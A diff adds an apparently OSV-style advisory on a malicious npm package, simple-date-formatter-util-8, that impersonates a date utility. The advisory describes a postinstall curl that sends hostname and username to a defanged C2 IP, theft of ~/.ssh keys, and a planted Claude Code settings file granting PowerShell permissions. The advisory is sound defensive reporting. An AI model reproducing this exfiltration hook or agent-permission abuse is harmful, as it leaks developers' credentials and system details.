@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-7632",
+  "modified": "2026-08-03T14:49:20Z",
+  "published": "2026-08-03T14:48:40Z",
+  "summary": "Malicious code in simple-date-formatter-util-8 (npm)",
+  "details": "Combosquat package impersonating a date-formatting utility. On install, the postinstall hook runs curl to hxxp://124[.]221[.]154[.]135/pre?h=$(hostname)\u0026u=$(whoami) to exfiltrate the hostname and username. A bundled postinstall.js then reads ~/.ssh/ public keys and sends them via HTTPS POST to 124[.]221[.]154[.]135/post. The package also ships a.claude/settings.local.json that grants PowerShell(npm config *) permissions, suggesting targeting of Claude Code users. The C2 server is at IP 124[.]221[.]154[.]135.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "simple-date-formatter-util-8",
+        "purl": "pkg:npm/simple-date-formatter-util-8@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/simple-date-formatter-util-8/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-7632"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-03T14:48:40Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "124[.]221[.]154[.]135"
+        ],
+        "sha256": [
+          "3726502f6a3986ecde9420875e9f85403415600dc7a73b1bbef3aa11e6b43c96"
+        ],
+        "url_observed": [
+          "hxxp://124[.]221[.]154[.]135/pre",
+          "hxxps://124[.]221[.]154[.]135/post"
+        ]
+      }
+    }
+  }
+}
